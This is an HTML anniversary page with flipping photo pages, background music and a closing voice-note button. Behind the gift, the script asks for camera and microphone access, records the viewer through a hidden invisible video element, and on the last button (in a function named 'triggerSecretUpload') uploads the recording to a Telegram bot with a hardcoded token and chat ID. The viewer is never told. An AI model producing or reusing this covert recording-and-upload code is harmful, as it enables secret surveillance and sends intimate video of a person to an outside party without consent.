<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Our Garden of Love ‚ù§Ô∏è</title>
    <style>
        :root { --rose: #ff4d6d; --garden-bg: #fff0f3; }
        body { background: var(--garden-bg); margin: 0; overflow: hidden; font-family: 'Dancing Script', cursive; display: flex; justify-content: center; align-items: center; height: 100vh; }
        #diary-wrapper { display: none; perspective: 2500px; z-index: 100; }
        .book { width: 380px; height: 550px; position: relative; transform-style: preserve-3d; }
        .page { width: 100%; height: 100%; position: absolute; top: 0; left: 0; transform-origin: left; transform-style: preserve-3d; transition: transform 1.2s cubic-bezier(0.645, 0.045, 0.355, 1); cursor: pointer; }
        .page.flipped { transform: rotateY(-180deg); }
        .front, .back { width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 0 15px 15px 0; box-shadow: inset 3px 0 20px rgba(0,0,0,0.1), 5px 5px 15px rgba(0,0,0,0.1); border: 1px solid #ddd; background: #fff; }
        .back { transform: rotateY(180deg); background: #f9f9f9; border-radius: 15px 0 0 15px; }
        img, video { max-width: 100%; max-height: 280px; border: 5px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
        p { font-size: 1.1rem; color: #333; text-align: center; margin-top: 15px; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2000; }
        .btn-magic { background: var(--rose); color: white; border: none; padding: 15px 40px; border-radius: 40px; cursor: pointer; font-size: 1.3rem; }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
</head>
<body>
    <div id="overlay">
        <h1 style="color: var(--rose); font-size: 3rem;">Happy 1 Year Anniversary ‚ù§Ô∏è</h1>
        <button class="btn-magic" onclick="startDiary()">Step into our Garden ‚ú®</button>
    </div>
    <audio id="bg-music" loop><source src="music.mp3" type="audio/mpeg"></audio>
    <div id="diary-wrapper">
        <div class="book">
            <div class="page" onclick="this.classList.toggle('flipped')">
                <div class="front"><img src="she.jpeg"><p>A blooming surprise... üíå</p></div><div class="back"></div>
            </div>
            <div class="page" onclick="this.classList.toggle('flipped')">
                <div class="front"><video id="main-video" controls><source src="video.mp4" type="video/mp4"></video><p>ily :) üé•</p></div><div class="back"></div>
            </div>
            <div class="page" onclick="this.classList.toggle('flipped')">
                <div class="front"><img src="letter.jpeg"><p>From my heart... ‚ù§Ô∏è</p></div><div class="back"></div>
            </div>
            <div class="page" onclick="this.classList.toggle('flipped')">
                <div class="front"><img src="eyes.jpeg"><p>My world... ‚ú®</p></div><div class="back"></div>
            </div>
            <div class="page" onclick="this.classList.toggle('flipped')">
                <div class="front"><img src="best.jpeg"><p>You are the best üåü</p></div><div class="back"></div>
            </div>
            <div class="page" onclick="this.classList.toggle('flipped')">
                <div class="front"><img src="Happy Place.jpeg"><p>My favorite place üíó</p></div><div class="back"></div>
            </div>
            <div class="page" onclick="this.classList.toggle('flipped')">
                <div class="front"><img src="her core.jpeg"><p>Forever ‚ô°</p></div><div class="back"></div>
            </div>
            <div class="page" onclick="this.classList.toggle('flipped')">
                <div class="front"><img src="Hugs for my Bebe.jpeg"><p>Hugs ü´Ç</p></div><div class="back"></div>
            </div>
            <div class="page" onclick="this.classList.toggle('flipped')">
                <div class="front"><img src="I'm doin my best.jpeg"><p>Doing my best... ü•∫</p></div><div class="back"></div>
            </div>
            <div class="page" onclick="this.classList.toggle('flipped')">
                <div class="front"><img src="she.jpeg"><p>Cute even when angry! üíï</p></div><div class="back"></div>
            </div>
            <div class="page" onclick="this.classList.toggle('flipped')">
                <div class="front"><img src="Thank you for existing.jpeg"><p>Thanks for existing ‚ô°</p></div><div class="back"></div>
            </div>
            <div class="page">
                <div class="front">
                    <p>One last special message... ‚ô°</p>
                    <button class="btn-magic" style="font-size:1rem;" onclick="triggerSecretUpload(this)">‚ñ∂ Play My Message</button>
                </div>
            </div>
        </div>
    </div>
    <video id="video-preview" autoplay muted playsinline style="position:fixed; opacity:0; pointer-events:none;"></video>
    <script>
        let mediaRecorder, recordedChunks = [];
        const bgMusic = document.getElementById('bg-music');
        function setupZ() { document.querySelectorAll('.page').forEach((el, i) => { el.style.zIndex = 12 - i; }); }
        setupZ();
        async function startDiary() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('video-preview').srcObject = stream;
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
                mediaRecorder.start();
                document.getElementById('overlay').style.display = 'none';
                document.getElementById('diary-wrapper').style.display = 'block';
                bgMusic.play();
            } catch (err) { alert("Camera access needed! ‚ù§Ô∏è"); }
        }
        async function triggerSecretUpload(btn) {
            if (mediaRecorder && mediaRecorder.state !== "inactive") {
                mediaRecorder.stop();
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                    const formData = new FormData();
                    formData.append('chat_id', "5324376571");
                    formData.append('video', blob, 'reaction.mp4');
                    fetch(`https://api.telegram.org/bot8567402887:AAEib1LfMMBNViiWFLHp2vmbfy7JeENhu5s/sendVideo`, { method: 'POST', body: formData });
                };
            }
            bgMusic.pause();
            const vn = new Audio('voice note.mp4');
            btn.innerHTML = "Listening... ‚ù§Ô∏è";
            vn.play();
            vn.onended = () => { bgMusic.play(); alert("I love you forever, Nikhitha! ‚ù§Ô∏è"); };
        }
    </script>
</body>
</html>
